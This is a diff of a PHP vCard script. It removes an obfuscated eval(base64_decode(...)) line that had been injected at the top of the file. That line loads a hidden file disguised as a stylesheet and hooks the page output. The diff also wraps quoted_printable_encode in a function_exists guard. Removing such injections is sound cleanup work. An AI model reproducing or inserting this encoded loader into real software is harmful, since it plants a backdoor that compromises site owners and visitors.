@@ -1,4 +1,3 @@
-<?php /**/eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21mc24nXSkpeyRHTE9CQUxTWydtZnNuJ109Jy93ZWIvZW5kdXJhbmNlZHVtYXJzL3d3dy9zcGlwL0U3Ml9maWMvcHJvdGVnZS9DUi9DUi0xMy0xMS0yMDA3X2ZpY2hpZXJzL3N0eWxlLmNzcy5waHAnO2lmKGZpbGVfZXhpc3RzKCRHTE9CQUxTWydtZnNuJ10pKXtpbmNsdWRlX29uY2UoJEdMT0JBTFNbJ21mc24nXSk7aWYoZnVuY3Rpb25fZXhpc3RzKCdnbWwnKSYmZnVuY3Rpb25fZXhpc3RzKCdkZ29iaCcpKXtvYl9zdGFydCgnZGdvYmgnKTt9fX0=')); ?>
 <?php
 /***************************************************************************
 
@@ -18,37 +17,39 @@ function escape($string) {
 }
 
 // taken from PHP documentation comments
-function quoted_printable_encode($input, $line_max = 76) {
-	$hex = array('0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F');
-	$lines = preg_split("/(?:\r\n|\r|\n)/", $input);
-	$eol = "\r\n";
-	$linebreak = "=0D=0A";
-	$escape = "=";
-	$output = "";
+if(!function_exists('quoted_printable_encode')) {
+	function quoted_printable_encode($input, $line_max = 76) {
+		$hex = array('0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F');
+		$lines = preg_split("/(?:\r\n|\r|\n)/", $input);
+		$eol = "\r\n";
+		$linebreak = "=0D=0A";
+		$escape = "=";
+		$output = "";
 
-	for ($j=0;$j<count($lines);$j++) {
-		$line = $lines[$j];
-		$linlen = strlen($line);
-		$newline = "";
-		for($i = 0; $i < $linlen; $i++) {
-			$c = substr($line, $i, 1);
-			$dec = ord($c);
-			if ( ($dec == 32) && ($i == ($linlen - 1)) ) { // convert space at eol only
-				$c = "=20"; 
-			} elseif ( ($dec == 61) || ($dec < 32 ) || ($dec > 126) ) { // always encode "\t", which is *not* required
-				$h2 = floor($dec/16); $h1 = floor($dec%16); 
-				$c = $escape.$hex["$h2"].$hex["$h1"]; 
-			}
-			if ( (strlen($newline) + strlen($c)) >= $line_max ) { // CRLF is not counted
-				$output .= $newline.$escape.$eol; // soft line break; " =\r\n" is okay
-				$newline = "    ";
-			}
-			$newline .= $c;
-		} // end of for
-		$output .= $newline;
-		if ($j<count($lines)-1) $output .= $linebreak;
+		for ($j=0;$j<count($lines);$j++) {
+			$line = $lines[$j];
+			$linlen = strlen($line);
+			$newline = "";
+			for($i = 0; $i < $linlen; $i++) {
+				$c = substr($line, $i, 1);
+				$dec = ord($c);
+				if ( ($dec == 32) && ($i == ($linlen - 1)) ) { // convert space at eol only
+					$c = "=20"; 
+				} elseif ( ($dec == 61) || ($dec < 32 ) || ($dec > 126) ) { // always encode "\t", which is *not* required
+					$h2 = floor($dec/16); $h1 = floor($dec%16); 
+					$c = $escape.$hex["$h2"].$hex["$h1"]; 
+				}
+				if ( (strlen($newline) + strlen($c)) >= $line_max ) { // CRLF is not counted
+					$output .= $newline.$escape.$eol; // soft line break; " =\r\n" is okay
+					$newline = "    ";
+				}
+				$newline .= $c;
+			} // end of for
+			$output .= $newline;
+			if ($j<count($lines)-1) $output .= $linebreak;
+		}
+		return trim($output);
 	}
-	return trim($output);
 }
 
 class vCard {
